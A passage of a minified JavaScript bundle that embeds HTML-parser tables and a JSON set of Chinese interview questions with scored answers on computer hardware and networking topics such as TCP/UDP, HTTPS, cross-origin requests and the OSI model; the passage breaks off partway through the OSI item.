Map(["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","textPath"].map(e=>[e.toLowerCase(),e]));d.B,d.BIG,d.BLOCKQUOTE,d.BODY,d.BR,d.CENTER,d.CODE,d.DD,d.DIV,d.DL,d.DT,d.EM,d.EMBED,d.H1,d.H2,d.H3,d.H4,d.H5,d.H6,d.HEAD,d.HR,d.I,d.IMG,d.LI,d.LISTING,d.MENU,d.META,d.NOBR,d.OL,d.P,d.PRE,d.RUBY,d.S,d.SMALL,d.SPAN,d.STRONG,d.STRIKE,d.SUB,d.SUP,d.TABLE,d.TT,d.U,d.UL,d.VAR;var Xa;(function(e){e[e.INITIAL=0]="INITIAL",e[e.BEFORE_HTML=1]="BEFORE_HTML",e[e.BEFORE_HEAD=2]="BEFORE_HEAD",e[e.IN_HEAD=3]="IN_HEAD",e[e.IN_HEAD_NO_SCRIPT=4]="IN_HEAD_NO_SCRIPT",e[e.AFTER_HEAD=5]="AFTER_HEAD",e[e.IN_BODY=6]="IN_BODY",e[e.TEXT=7]="TEXT",e[e.IN_TABLE=8]="IN_TABLE",e[e.IN_TABLE_TEXT=9]="IN_TABLE_TEXT",e[e.IN_CAPTION=10]="IN_CAPTION",e[e.IN_COLUMN_GROUP=11]="IN_COLUMN_GROUP",e[e.IN_TABLE_BODY=12]="IN_TABLE_BODY",e[e.IN_ROW=13]="IN_ROW",e[e.IN_CELL=14]="IN_CELL",e[e.IN_SELECT=15]="IN_SELECT",e[e.IN_SELECT_IN_TABLE=16]="IN_SELECT_IN_TABLE",e[e.IN_TEMPLATE=17]="IN_TEMPLATE",e[e.AFTER_BODY=18]="AFTER_BODY",e[e.IN_FRAMESET=19]="IN_FRAMESET",e[e.AFTER_FRAMESET=20]="AFTER_FRAMESET",e[e.AFTER_AFTER_BODY=21]="AFTER_AFTER_BODY",e[e.AFTER_AFTER_FRAMESET=22]="AFTER_AFTER_FRAMESET"})(Xa||(Xa={}));d.TABLE,d.TBODY,d.TFOOT,d.THEAD,d.TR;d.CAPTION,d.COL,d.COLGROUP,d.TBODY,d.TD,d.TFOOT,d.TH,d.THEAD,d.TR;x.AREA,x.BASE,x.BASEFONT,x.BGSOUND,x.BR,x.COL,x.EMBED,x.FRAME,x.HR,x.IMG,x.INPUT,x.KEYGEN,x.LINK,x.META,x.PARAM,x.SOURCE,x.TRACK,x.WBR;const Go=JSON.parse('[{"key":"计算机硬件","content":"<h1>计算机硬件</h1>\\n<h2>请解释一下什么是处理器架构（CPU Architecture）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。</li>\\n</ul>\\n<h2>指令集（Instruction Set）是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。</li>\\n</ul>\\n<h2>热插拔（Hot Swap）是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。</li>\\n</ul>\\n<h2>什么是多核处理器（Multi-Core Processor）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。</li>\\n</ul>\\n<h2>虚拟化（Virtualization）是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 计算机硬件\\n\\n","depth":1,"text":"计算机硬件","tokens":[{"type":"text","raw":"计算机硬件","text":"计算机硬件","escaped":false}]},{"type":"heading","raw":"## 请解释一下什么是处理器架构（CPU Architecture）？\\n\\n","depth":2,"text":"请解释一下什么是处理器架构（CPU Architecture）？","tokens":[{"type":"text","raw":"请解释一下什么是处理器架构（CPU Architecture）？","text":"请解释一下什么是处理器架构（CPU Architecture）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","task":false,"loose":false,"text":"**1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","tokens":[{"type":"text","raw":"**1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","text":"**1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","text":" 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 指令集（Instruction Set）是什么？\\n\\n","depth":2,"text":"指令集（Instruction Set）是什么？","tokens":[{"type":"text","raw":"指令集（Instruction Set）是什么？","text":"指令集（Instruction Set）是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","task":false,"loose":false,"text":"**1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","tokens":[{"type":"text","raw":"**1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","text":"**1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","text":" 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 热插拔（Hot Swap）是什么？\\n\\n","depth":2,"text":"热插拔（Hot Swap）是什么？","tokens":[{"type":"text","raw":"热插拔（Hot Swap）是什么？","text":"热插拔（Hot Swap）是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","task":false,"loose":false,"text":"**1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","tokens":[{"type":"text","raw":"**1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","text":"**1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","text":" 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是多核处理器（Multi-Core Processor）？\\n\\n","depth":2,"text":"什么是多核处理器（Multi-Core Processor）？","tokens":[{"type":"text","raw":"什么是多核处理器（Multi-Core Processor）？","text":"什么是多核处理器（Multi-Core Processor）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","task":false,"loose":false,"text":"**1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","tokens":[{"type":"text","raw":"**1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","text":"**1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","text":" 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 虚拟化（Virtualization）是什么？\\n\\n","depth":2,"text":"虚拟化（Virtualization）是什么？","tokens":[{"type":"text","raw":"虚拟化（Virtualization）是什么？","text":"虚拟化（Virtualization）是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","task":false,"loose":false,"text":"**1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","tokens":[{"type":"text","raw":"**1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","text":"**1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","text":" 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","escaped":false}]}]}]}]},{"key":"计算机网络","content":"<h1>计算机网络</h1>\\n<h2>网络协议是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。</li>\\n</ul>\\n<h2>什么是TCP/IP和UDP</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达</li>\\n<li><strong>1：</strong> UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的</li>\\n</ul>\\n<h2>TCP与UDP区别是什么</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（8 分）</h4>\\n<ul>\\n<li><strong>1：</strong> TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达</li>\\n<li><strong>1：</strong> UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；</li>\\n<li><strong>1：</strong> TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；</li>\\n<li><strong>1：</strong> UDP通信类似于学校广播，靠着广播播报直接进行通信。</li>\\n<li><strong>1：</strong> TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；</li>\\n<li><strong>1：</strong> TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。</li>\\n<li><strong>1：</strong> TCP首部开销（20字节）比UDP首部开销（8字节）要大</li>\\n<li><strong>1：</strong> UDP 的主机不需要维持复杂的连接状态表</li>\\n</ul>\\n<h2>HTTP和HTTPS的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 安全性：</p>\\n<ul>\\n<li>HTTP是明文传输，数据可能被窃听和篡改</li>\\n<li>HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 端口：</p>\\n<ul>\\n<li>HTTP默认使用80端口</li>\\n<li>HTTPS默认使用443端口</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 证书：</p>\\n<ul>\\n<li>HTTP不需要证书</li>\\n<li>HTTPS需要CA机构颁发的SSL证书</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 性能：</p>\\n<ul>\\n<li>HTTP性能更好，因为没有加密解密过程</li>\\n<li>HTTPS因为需要加密解密，性能会有所损耗</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用场景：</p>\\n<ul>\\n<li>HTTP适用于对安全要求不高的场景</li>\\n<li>HTTPS适用于需要保护用户隐私和数据安全的场景</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>什么是跨域？如何解决跨域问题？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 什么是跨域：</p>\\n<ul>\\n<li>浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求</li>\\n<li>同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> CORS（跨域资源共享）：</p>\\n<ul>\\n<li>使用场景：现代浏览器的首选跨域解决方案，适用于REST API</li>\\n<li>优点：支持所有类型的HTTP请求，配置灵活</li>\\n<li>缺点：需要服务器配合，老版本浏览器可能不支持</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">// 服务器端设置\\napp.use((req, res, next) =&gt; {\\n  res.header(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;);\\n  res.header(&#39;Access-Control-Allow-Methods&#39;, &#39;GET,PUT,POST,DELETE&#39;);\\n  res.header(&#39;Access-Control-Allow-Headers&#39;, &#39;Content-Type&#39;);\\n  next();\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> JSONP：<ul>\\n<li>使用场景：兼容老版本浏览器，只需要GET请求的场景</li>\\n<li>优点：兼容性好，实现简单</li>\\n<li>缺点：只支持GET请求，可能存在安全问题</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">function jsonp(url, callback) {\\n  const script = document.createElement(&#39;script&#39;);\\n  script.src = `${url}?callback=${callback}`;\\n  document.body.appendChild(script);\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 代理服务器：<ul>\\n<li>使用场景：需要隐藏跨域细节，适合生产环境</li>\\n<li>优点：可以集中处理跨域问题，对前端透明</li>\\n<li>缺点：需要额外的服务器配置和维护</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">// nginx配置示例\\nlocation /api {\\n  proxy_pass http://backend-server;\\n  proxy_set_header Host $host;\\n  proxy_set_header X-Real-IP $remote_addr;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> postMessage：<ul>\\n<li>使用场景：iframe跨域通信，不同标签页通信</li>\\n<li>优点：可以实现跨窗口通信，安全性好</li>\\n<li>缺点：使用相对复杂，需要双方页面都进行相应处理</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">// 发送消息\\nwindow.postMessage(&#39;Hello&#39;, &#39;http://receiver.com&#39;);\\n\\n// 接收消息\\nwindow.addEventListener(&#39;message&#39;, (event) =&gt; {\\n  if (event.origin !== &#39;http://sender.com&#39;) return;\\n  console.log(event.data);\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> WebSocket：<ul>\\n<li>使用场景：需要实时双向通信的场景</li>\\n<li>优点：支持全双工通信，没有跨域限制</li>\\n<li>缺点：需要专门的服务器支持，协议和HTTP不同</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const ws = new WebSocket(&#39;ws://example.com&#39;);\\nws.onmessage = (event) =&gt; {\\n  console.log(event.data);\\n};\\n</code></pre>\\n<h2>OSI七层模型是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 应用层（第7层）：</p>\\n<ul>\\n<li>为应用程序提供网络服务</li>\\n<li>协议：HTTP、FTP、SMTP等</li>\\n<li>数据单位：消息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 表示层（第6层）：</p>\\n<ul>\\n<li>数据格式转换、加密解密</li>\\n<li>确保数据可以被接收方理解</li>\\n<li>数据单位：消息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 会话层（第5层）：</p>\\n<ul>\\n<li>建立、管理和终止会话</li>\\n<li>提供对话控制</li>\\n<li>数据单位：消息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 传输层（第4层）：</p>\\n<ul>\\n<li>端到端的可靠数据传输</li>\\n<li>协议：TCP、UDP</li>\\n<li>数据单位：段（TCP）、数据报（UDP）</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 网络层（第3层）：</p>\\n<ul>\\n<li>负责数据包的路由和转发</li>\\n<li>协议：IP、ICMP</li>\\n<li>数据单位：数据包</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 